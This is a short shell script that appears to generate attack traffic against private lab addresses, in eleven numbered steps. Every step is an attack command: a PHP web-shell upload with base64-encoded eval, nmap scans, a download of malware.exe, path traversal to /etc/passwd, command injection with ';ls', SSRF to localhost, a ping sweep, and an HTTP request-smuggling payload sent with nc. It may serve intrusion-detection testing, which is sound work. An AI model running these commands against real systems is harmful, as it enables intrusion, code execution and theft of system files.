#!/bin/sh

apk add nmap curl

echo "Starting attack 01"
curl -X POST "http://192.168.7.69/upload.php" -d 'file=<?php eval(base64_decode("c3lzdGVtKCJpZCIpOw==")); ?>'

echo "Starting attack 02"
nmap -sS 192.168.7.69

echo "Starting attack 03"
curl -O "http://192.168.7.69/malware.exe"

echo "Starting attack 04"
for i in $(seq 1 15); do curl -s "http://192.168.7.69/page$i.html"; done

echo "Starting attack 05"
curl "http://192.168.7.69/../../etc/passwd"

echo "Starting attack 06"
curl "http://192.168.7.69/search.php?query=;ls"

echo "Starting attack 07"
curl "http://192.168.7.69/fetch?url=http://127.0.0.1:80"

echo "Starting attack 08"
nmap -sV 192.168.7.69

echo "Starting attack 09"
curl "http://192.168.7.69:8888/"

echo "Starting attack 10"
for i in `seq 1 5`; do
    ping -c 1 -W 1 192.168.7.$i;
done

echo "Starting attack 11"
printf "POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 10\r\nTransfer-Encoding: chunked\r\n\r\n" | nc 192.168.8.69 5000

echo "Done."
